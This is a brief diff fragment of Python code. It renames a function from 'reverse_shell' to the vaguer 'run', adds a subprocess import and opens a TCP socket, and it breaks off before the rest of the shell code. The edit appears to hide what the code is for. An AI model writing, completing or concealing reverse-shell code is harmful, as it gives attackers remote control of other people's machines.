@@ -1,6 +1,7 @@
 import socket
-
-def reverse_shell(ip, port):
+import subprocess 
+ 
+def run(ip, port):
     # Crear un socket TCP
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
